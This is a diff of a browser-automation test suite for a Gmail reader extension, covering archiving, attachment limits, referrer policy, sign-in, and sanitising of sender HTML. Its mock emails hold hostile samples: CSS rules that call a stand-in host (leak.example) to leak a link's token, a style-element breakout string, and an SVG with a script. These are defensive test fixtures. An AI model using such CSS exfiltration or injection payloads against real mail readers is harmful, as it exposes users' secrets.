@@ -54,7 +54,7 @@ const { FX } = require("./gmail-mock.js");
   await view(0);
   let f = await box();
   await f.waitForFunction(() => document.querySelector(".pdfViewer .page canvas") && /Quarterly/.test(document.querySelector(".textLayer")?.textContent || ""), null, { timeout: 15000 });
-  results.viewer = { pdfPages: await f.evaluate(() => document.querySelectorAll(".pdfViewer .page").length), sandboxFetch: await f.evaluate(async () => { try { await fetch("https://gmail.googleapis.com/"); return "allowed"; } catch { return "blocked"; } }) };
+  results.viewer = { pdfPages: await f.evaluate(() => document.querySelectorAll(".pdfViewer .page").length), sandboxFetch: await f.evaluate(async () => { try { await fetch("https://gmail.googleapis.com/sandbox-probe"); return "allowed"; } catch { return "blocked"; } }) };
   const dl = page.waitForEvent("download", { timeout: 5000 }).catch(() => null);
   await page.locator("#v-dl").click();
   const d = await dl;
@@ -191,6 +191,20 @@ const { FX } = require("./gmail-mock.js");
   await page.waitForFunction(() => ![...document.querySelectorAll("#folder-list .folder .nm")].some(e => e.textContent === "Zeta"), null, { timeout: 5000 }).catch(() => {});
   results.folderOps.deleted = !gmail.labels.some(l => l.name === "Zeta") && !(await page.locator("#folder-list .folder .nm").allTextContents()).includes("Zeta");
 
+  // All Mail lists every message, each placed by its labels: archive there takes a message out
+  // of Inbox and leaves its row, and undo puts it back
+  await folder("All Mail");
+  await page.locator("#rows .row", { hasText: "Subject m-4" }).click(); await page.waitForTimeout(600);
+  const allRows = await page.locator("#rows .row").count(), allMods = mods().length;
+  results.allMail = { shownIn: await page.locator("#r-folder").textContent() };
+  await page.locator("#list").focus(); await page.keyboard.press("e");
+  await page.waitForFunction(() => /^archived|^already/.test(document.getElementById("st-msg").textContent), null, { timeout: 5000 }).catch(() => {});
+  Object.assign(results.allMail, { status: await page.locator("#st-msg").textContent(), call: mods().slice(allMods).at(-1) ?? null, rows: await page.locator("#rows .row").count() - allRows, inbox: gmail.messages.get("m4").labelIds.includes("INBOX") });
+  await page.keyboard.press("z");
+  await page.waitForFunction(() => /^undone/.test(document.getElementById("st-msg").textContent), null, { timeout: 5000 }).catch(() => {});
+  await page.waitForTimeout(600);
+  results.allMail.undone = gmail.messages.get("m4").labelIds.includes("INBOX");
+
   // contact card: recent mail with the person, through the search
   await folder("Inbox");
   await page.locator("#rows .row", { hasText: "Subject m-2" }).click(); await page.waitForTimeout(600);
@@ -204,6 +218,7 @@ const { FX } = require("./gmail-mock.js");
   const [printPage] = await Promise.all([ctx.waitForEvent("page"), page.keyboard.press("p")]);
   await printPage.waitForSelector(".msg .body", { timeout: 8000 });
   results.print = { body: (await printPage.locator(".msg .body p").first().innerText()).slice(0, 12), csp: await printPage.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content),
+    referrer: await printPage.evaluate(() => document.querySelector('meta[name="referrer"]')?.content),
     imgs: await printPage.evaluate(() => [...document.querySelector(".msg .body").shadowRoot.querySelectorAll("img")].map(i => (i.getAttribute("src") || "").slice(0, 15))) };
   await printPage.close(); await page.bringToFront();
 
@@ -227,6 +242,22 @@ const { FX } = require("./gmail-mock.js");
   await page.waitForFunction(() => document.getElementById("st-msg").textContent.startsWith("sent"), null, { timeout: 15000 });
   results.fwd.parts = partsOf(lastUpload());
   results.fwd.meta = lastUpload().meta;
+
+  // the attachment limit: a file attached again counts once, and a drop reports what it attached
+  await page.locator("#list").focus(); await page.keyboard.press("c"); await page.waitForSelector("#compose:not(.hidden)");
+  const MB = 1048576;
+  const drop = files => page.evaluate(files => {
+    const dt = new DataTransfer();
+    for (const [name, size] of files) dt.items.add(new File([new Uint8Array(size)], name, { type: "application/octet-stream" }));
+    const ed = document.getElementById("c-editor"), r = ed.getBoundingClientRect();
+    ed.dispatchEvent(new DragEvent("drop", { dataTransfer: dt, bubbles: true, cancelable: true, clientX: r.left + 20, clientY: r.top + 12 }));
+    const notice = document.getElementById("notice");
+    return { status: document.getElementById("st-msg").textContent, notice: notice.classList.contains("hidden") ? "" : document.getElementById("notice-text").textContent, chips: document.querySelectorAll("#c-filelist .c-file").length };
+  }, files);
+  results.attachLimit = { first: await drop([["a.bin", 13 * MB], ["small.txt", 10]]), again: await drop([["a.bin", 13 * MB]]), mixed: await drop([["a.bin", 13 * MB], ["b.txt", 20]]), over: await drop([["c.bin", 13 * MB], ["d.txt", 30]]) };
+  page.once("dialog", d => d.accept());
+  await page.click("#c-discard");
+  await page.waitForFunction(() => document.getElementById("compose").classList.contains("hidden"), null, { timeout: 8000 });
 
   // new message with an attachment and an inline image: held, cancelled, then sent
   await page.locator("#list").focus(); await page.keyboard.press("c"); await page.waitForSelector("#compose:not(.hidden)");
@@ -292,6 +323,54 @@ const { FX } = require("./gmail-mock.js");
   await page.waitForTimeout(500);
   results.newMail = { title: await page.title(), unread: [...gmail.messages.values()].filter(m => m.labelIds.includes("INBOX") && m.labelIds.includes("UNREAD")).length, dotted: dotted.slice(0, 22), listed: await page.locator("#rows .row .sb", { hasText: "Fresh mail" }).count(), history: gmail.calls.filter(c => c.path === "/history").length > 0 };
 
+  // A sender's style sheet loses the rules that read the message (an attribute selector, :has()),
+  // also inside a media query, and a sheet without any stays as written; a string that would end
+  // the style element once the browser has written the sheet back ends nothing. The remote
+  // picture is asked for without a referrer, and nothing else is.
+  const SHEET = ".keep { color: rgb(1, 2, 3) } a[href*=\"token\"] { background: url(https://leak.example/attr.png) } div:has(> a) { background: url(https://leak.example/has.png) }" +
+    " @media screen { [data-x] .y { color: red } .kept-in-media { color: blue } } .s::after { content: \"\\3c /style>\\3c b id=broke>x\\3c /b>\" }";
+  const PLAIN_SHEET = ".plain{color:#123456}/* as written */";
+  gmail.addMessage({ id: "css1", labels: ["Label_5"], subject: "Styled", from: "\"Styler\" <styler@x.com>", cc: "", inline: [],
+    html: "<style>" + SHEET + "</style><style>" + PLAIN_SHEET + "</style><div><a href=\"https://site.example/reset?token=SECRET\">reset</a></div><div class=\"keep s\">kept</div><img id=\"remote\" src=\"https://img.example/pixel.png\" width=\"1\" height=\"1\">" });
+  // More references to parts the message does not have than the 60 it may fetch, before its own picture.
+  gmail.addMessage({ id: "cap1", labels: ["Label_5"], subject: "Many pictures", from: "\"Styler\" <styler@x.com>", cc: "",
+    html: Array.from({ length: 70 }, (_, i) => "<img src=\"cid:none-" + i + "@x\" width=\"1\" height=\"1\">").join("") + "<img id=\"own\" src=\"cid:cap1-pic@x\">" });
+  gmail.addMessage({ id: "svg1", labels: ["Label_5"], subject: "Vector", from: "\"Styler\" <styler@x.com>", cc: "", html: "<p>See the logo.</p>", inline: [],
+    files: [{ name: "logo.svg", type: "image/svg+xml", bytes: Buffer.from("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"40\" height=\"20\"><rect width=\"40\" height=\"20\" fill=\"#c00\"/><script>window.ran = 1</script></svg>") }] });
+  await page.locator("#folder-list .folder", { hasText: "Travel" }).first().locator(".tw").click();
+  await folder("2025");
+  const cdp = await ctx.newCDPSession(page);
+  await cdp.send("Network.enable");
+  const policies = [];
+  cdp.on("Network.requestWillBeSent", e => { if (e.request.url.startsWith("https://img.example/")) policies.push(e.request.referrerPolicy); });
+  await page.locator("#rows .row", { hasText: "Styled" }).click();
+  await page.waitForFunction(() => document.getElementById("r-subject").textContent === "Styled", null, { timeout: 8000 });
+  for (let i = 0; i < 50 && !gmail.images.length; i++) await page.waitForTimeout(100);
+  const styled = page.frameLocator("#r-body");
+  results.css = { sheets: (await styled.locator("style").evaluateAll(els => els.map(e => e.textContent))).slice(1), broke: await styled.locator("#broke").count(),
+    kept: await styled.locator(".keep").evaluate(e => getComputedStyle(e).color), referrer: await styled.locator('meta[name="referrer"]').getAttribute("content"),
+    page: await page.evaluate(() => document.querySelector('meta[name="referrer"]')?.content), images: gmail.images.map(i => [i.url, i.from, i.referer]), policies };
+  await cdp.detach();
+  await page.locator("#rows .row", { hasText: "Many pictures" }).click();
+  await page.waitForFunction(() => document.getElementById("r-subject").textContent === "Many pictures", null, { timeout: 8000 });
+  await page.waitForTimeout(500);
+  results.cap = { own: ((await page.frameLocator("#r-body").locator("#own").getAttribute("src")) || "").slice(0, 14), others: await page.frameLocator("#r-body").locator('img[src^="cid:"]').count() };
+  // An SVG attachment is shown as a bitmap of itself, so the picture opened in a tab is a PNG,
+  // not a document of the sender's under the extension's address.
+  await page.locator("#rows .row", { hasText: "Vector" }).click();
+  await page.waitForFunction(() => document.getElementById("r-subject").textContent === "Vector", null, { timeout: 8000 });
+  await page.waitForSelector("#r-attach .att-card");
+  await view(0);
+  await page.waitForSelector("#v-body img.v-img", { timeout: 8000 });
+  await page.waitForFunction(() => document.querySelector("#v-body img.v-img").naturalWidth > 0, null, { timeout: 8000 }).catch(() => {});
+  results.svg = await page.evaluate(() => { const i = document.querySelector("#v-body img.v-img"); return { width: i.naturalWidth, height: i.naturalHeight, blob: i.src.startsWith("blob:"), density: /^blob:\S+ [\d.]+x$/.test(i.srcset) }; });
+  const [svgTab] = await Promise.all([ctx.waitForEvent("page"), page.evaluate(() => { window.open(document.querySelector("#v-body img.v-img").src, "_blank"); })]);
+  await svgTab.waitForLoadState();
+  results.svg.opened = await svgTab.evaluate(() => document.contentType);
+  await svgTab.close(); await page.bringToFront();
+  await page.keyboard.press("Escape");
+  await page.waitForSelector("#viewer.hidden", { state: "attached", timeout: 5000 }).catch(() => {});
+
   // sign out: asked first, and Cancel changes nothing; once confirmed the token is revoked and
   // forgotten, and the sign-in page comes back
   await page.locator("#list").focus(); await page.keyboard.press(",");
@@ -304,6 +383,13 @@ const { FX } = require("./gmail-mock.js");
   await page.locator("#signout").click();
   await page.waitForSelector("#signin:not(.hidden)", { timeout: 8000 });
   results.signOut = { panel: await page.locator("#signin-none").isVisible(), app: await page.locator("#app").isHidden(), revoked: gmail.calls.some(c => c.path === "/revoke"), token: await page.evaluate(async () => (await chrome.storage.session.get("gmToken")).gmToken ?? null) };
+
+  // only the button starts a sign-in: no flow so far, and one that may show Google's window once it is pressed
+  const flowsBefore = gmail.signIns.length;
+  await page.locator("#retry").click();
+  for (let i = 0; i < 50 && gmail.signIns.length === flowsBefore; i++) await page.waitForTimeout(100);
+  await page.waitForTimeout(500);
+  results.signInFlows = { before: gmail.signIns.slice(0, flowsBefore), pressed: gmail.signIns.slice(flowsBefore), panel: await page.locator("#signin").isVisible() };
 
   results.cspViolations = cspViolations;
   console.log(JSON.stringify(results, null, 1));
@@ -320,7 +406,7 @@ const { FX } = require("./gmail-mock.js");
   expect(results.attach.cards === 7 && results.attach.labels.join(",") === "PDF,CSV,ZIP,,DOC,XLS,PPT" && results.attach.thumbs.length === 1 && results.attach.thumbs[0].startsWith("data:image/png"), "attachment strip: " + JSON.stringify(results.attach));
   const v = results.viewer;
   expect(v.pdfPages === 2 && v.sandboxFetch === "blocked" && v.download === "report.pdf:true" && v.csv === "Z80,2,6502,1" && v.zip.includes("src/main.c") && v.img === 1 && v.doc && v.sheet === "Item,Cost,Z80,2.5,6502,1.25", "viewer through attachments.get: " + JSON.stringify(v));
-  expect(/No preview available for this file \(no preview available\)/.test(v.deck.note) && v.deck.raw === "View as text" && v.deck.text === "not really a deck" && v.deck.label === "" && v.closed, "no converter: the deck is offered as text: " + JSON.stringify(v.deck));
+  expect(/^No preview available for this file\. /.test(v.deck.note) && v.deck.raw === "View as text" && v.deck.text === "not really a deck" && v.deck.label === "" && v.closed, "no converter: the deck is offered as text: " + JSON.stringify(v.deck));
   const u = results.unsafe;
   expect(!u.error && !u.scripts && !u.forms && !u.frames && !u.refresh && !u.handlers && u.link && !u.link.ping && u.link.target === "_blank" && u.pwned === null, "the reader cleans the sender's own HTML: " + JSON.stringify(u));
   expect(!/[‪-‮⁦-⁩]/.test(results.bidi) && results.bidi.includes("Pay eulav") && results.bidi.includes("Bobevil"), "bidi controls removed: " + JSON.stringify(results.bidi));
@@ -337,14 +423,19 @@ const { FX } = require("./gmail-mock.js");
   expect(a.undelete.label === "Undelete" && a.undelete.call?.addLabelIds?.join() === "INBOX" && a.undelete.call.removeLabelIds.join() === "TRASH" && a.undelete.rowsAfter === a.undelete.rows - 1 && /^Undo: restore 1 message to Inbox/.test(a.undelete.undo), "undelete from the reader: " + JSON.stringify(a.undelete));
   expect(fo.emptied && fo.trashCount === "" && /^marked Projects read/.test(fo.markRead.status) && fo.markRead.unreadLeft === 0, "empty Trash and mark all read: " + JSON.stringify([fo.emptied, fo.trashCount, fo.markRead]));
   expect(fo.renamed.labels.includes("Work") && fo.renamed.labels.includes("Work/FPGA") && !fo.renamed.labels.includes("Projects") && fo.renamed.names.includes("Work") && fo.renamed.names.includes("FPGA") && fo.renamed.names.includes("Zeta") && fo.deleted, "folders created, renamed with the subfolder, deleted: " + JSON.stringify(fo.renamed) + " " + fo.deleted);
+  const am = results.allMail;
+  expect(am.shownIn === "Inbox" && /^archived 1 message/.test(am.status) && am.call?.removeLabelIds?.join() === "INBOX" && am.call.addLabelIds.length === 0 && am.rows === 0 && !am.inbox && am.undone, "archive in All Mail takes the message out of Inbox: " + JSON.stringify(am));
   expect(results.card.head.includes("s2@x.com") && results.card.recent >= 1 && /\(from:s2@x\.com OR to:s2@x\.com OR cc:s2@x\.com\)/.test(results.card.q || ""), "contact card through a person search: " + JSON.stringify(results.card));
-  expect(results.print.body.startsWith("Body of") && /img-src data: https:/.test(results.print.csp) && results.print.imgs.length > 0 && results.print.imgs.every(i => i.startsWith("data:")), "print page with the Gmail image policy: " + JSON.stringify(results.print));
+  expect(results.print.body.startsWith("Body of") && /img-src data: https:/.test(results.print.csp) && results.print.imgs.length > 0 && results.print.imgs.every(i => i.startsWith("data:")) && results.print.referrer === "no-referrer", "print page with the Gmail image policy: " + JSON.stringify(results.print));
   const rp = results.reply;
   expect(rp.title === "Reply" && rp.to.includes("s3@x.com") && rp.subject === "Re: Subject m-3" && rp.upload.path === "/upload/messages/send" && rp.upload.meta.threadId === "t-m3" && rp.upload.headers["in-reply-to"] === "<m3@x.com>" && rp.upload.headers.references === "<m3@x.com>" && rp.upload.quoted && rp.upload.cid, "a reply joins the thread with chained headers: " + JSON.stringify(rp));
   expect(results.fwd.chips.length === 7 && results.fwd.parts.filter(p => p[2] && !/^inline-/.test(p[2])).length === 7 && results.fwd.parts.some(p => p[2] === "report.pdf") && results.fwd.parts.some(p => p[2] === "deck.pptx") && results.fwd.meta.threadId === "t-m3", "a forward embeds the original's files and stays in its thread: " + JSON.stringify(results.fwd));
   const sd = results.send;
   expect(/^Sending in \d s: send "Gmail runtime test"/.test(sd.pending) && sd.afterCancel.to.includes("alice@example.com") && /note\.txt/.test(sd.afterCancel.files), "undo-send holds and restores: " + JSON.stringify([sd.pending, sd.afterCancel]));
   expect(sd.upload.path === "/upload/messages/send" && sd.upload.headers.to === "Alice <alice@example.com>, bob@example.com" && sd.upload.headers.subject === "Gmail runtime test" && sd.upload.parts.some(p => p[2] === "note.txt") && sd.upload.parts.some(p => p[1] === "image/png" && /^inline-1\.png$/.test(p[2])) && sd.upload.cid && sd.upload.uploads === 1 && sd.upload.sentLabel && sd.closed, "a new message goes out as one upload with its file and inline image: " + JSON.stringify(sd.upload));
+  const al = results.attachLimit;
+  expect(al.first.status === "attached 2 files" && al.first.chips === 2 && al.again.status === "attached 2 files" && al.again.chips === 2 && !al.again.notice && al.mixed.status === "attached 1 file" && al.mixed.chips === 3 && !al.mixed.notice &&
+    al.over.status === "attached 1 file" && al.over.chips === 4 && /^Not attached: c\.bin\. Attachments are limited to 25 MB/.test(al.over.notice), "a file attached again counts once, and a drop says what it attached: " + JSON.stringify(al));
   const dr = results.draft;
   expect(dr.title === "Draft" && dr.chips.length === 1 && /^notes\.txt/.test(dr.chips[0]) && dr.to.includes("s3@x.com") && dr.imgs.every(s => s.startsWith("data:")) && dr.imgs.length >= 1 && dr.overlay !== "fixed", "a draft opens with its file and inline image: " + JSON.stringify([dr.title, dr.chips, dr.to, dr.imgs, dr.overlay]));
   expect(dr.save.path === "/upload/drafts/r-d1" && dr.save.method === "PUT" && dr.save.meta.message.threadId === "t-m3" && dr.save.headers["in-reply-to"] === "<m3@x.com>" && dr.save.parts.some(p => p[2] === "notes.txt") && dr.save.parts.some(p => p[1] === "image/png") && dr.save.edited && dr.save.rows === dr.save.rowsBefore && dr.save.drafts.includes("r-d1"), "saving the draft keeps its draft id, file and image: " + JSON.stringify(dr.save));
@@ -352,13 +443,23 @@ const { FX } = require("./gmail-mock.js");
   expect(/^\d+ addresses learned from Inbox and Sent/.test(results.ab.summary) && results.ab.signOut && /^Baltazar Mail for Gmail™ \d+\.\d+\.\d+$/.test(results.ab.version), "address book and the sign-out button: " + JSON.stringify(results.ab));
   const nm = results.newMail;
   expect(nm.title === `(${nm.unread}) Baltazar Mail for Gmail™` && nm.unread >= 1 && nm.dotted === "data:image/png;base64," && nm.listed === 1 && nm.history, "new mail through history: " + JSON.stringify(nm));
+  const cs = results.css;
+  expect(cs.sheets.length === 2 && !/\[|:has\(/.test(cs.sheets[0]) && /\.keep\b/.test(cs.sheets[0]) && /@media screen \{\s*\.kept-in-media/.test(cs.sheets[0]) && !/<\/style/i.test(cs.sheets[0]) && cs.broke === 0 && cs.kept === "rgb(1, 2, 3)" &&
+    cs.sheets[1] === ".plain{color:#123456}/* as written */", "a sender's style sheet keeps only rules that do not read the message: " + JSON.stringify([cs.sheets, cs.broke, cs.kept]));
+  expect(cs.referrer === "no-referrer" && cs.page === "no-referrer" && cs.images.length === 1 && cs.images[0][0] === "https://img.example/pixel.png" && cs.images[0][1] === "about:srcdoc" && cs.images[0][2] === "" && cs.policies.length === 1 && cs.policies[0] === "no-referrer",
+    "a remote picture is asked for once, without a referrer: " + JSON.stringify([cs.referrer, cs.page, cs.images, cs.policies]));
+  expect(results.cap.own === "data:image/png" && results.cap.others === 70, "references to parts a message does not have take none of its 60 inline images: " + JSON.stringify(results.cap));
+  expect(results.svg.width === 40 && results.svg.height === 20 && results.svg.blob && results.svg.density && results.svg.opened === "image/png", "an SVG attachment is shown, and opens, as a bitmap: " + JSON.stringify(results.svg));
   const sk = results.signOutDeclined;
   expect(/^Sign out of me@gmail\.com\? /.test(sk.asked) && sk.settings && sk.app && !sk.revoked, "sign out asks first, and Cancel keeps the sign-in: " + JSON.stringify(sk));
   const so = results.signOut;
   expect(so.panel && so.app && so.revoked && so.token === null, "sign out: " + JSON.stringify(so));
-  // Blocked on purpose: the sandbox's own fetch (tried above), images where the reader has them
-  // off (Trash), and a cid: source that was never meant to load from the network.
-  const unexpectedCsp = (results.cspViolations || []).filter(x => !/img-src ('none|data:\\?")/.test(x) && !/gmail\.googleapis\.com\//.test(x) && !/Loading the image 'cid:/.test(x));
+  const sf = results.signInFlows;
+  expect(sf.before.length === 0 && sf.pressed.length === 1 && sf.pressed[0].how === "flow" && sf.pressed[0].interactive && sf.pressed[0].prompt === "select_account consent" && sf.panel, "no sign-in starts by itself; the button starts one: " + JSON.stringify(sf));
+  // Blocked on purpose: the sandbox's own fetch (tried above, of an address nothing else asks
+  // for), images where the reader has them off (Trash), and a cid: source that was never meant to
+  // load from the network.
+  const unexpectedCsp = (results.cspViolations || []).filter(x => !/img-src ('none|data:\\?")/.test(x) && !/gmail\.googleapis\.com\/sandbox-probe\b/.test(x) && !/Loading the image 'cid:/.test(x));
   expect(unexpectedCsp.length === 0, "content security policy blocked something the app needs: " + JSON.stringify(unexpectedCsp.slice(0, 5)));
   expect(!unexpectedHosts.size, "no request left for the real network: " + [...unexpectedHosts].join(", "));
   if (errors.length) { console.error("FAILED:", errors); process.exit(1); }
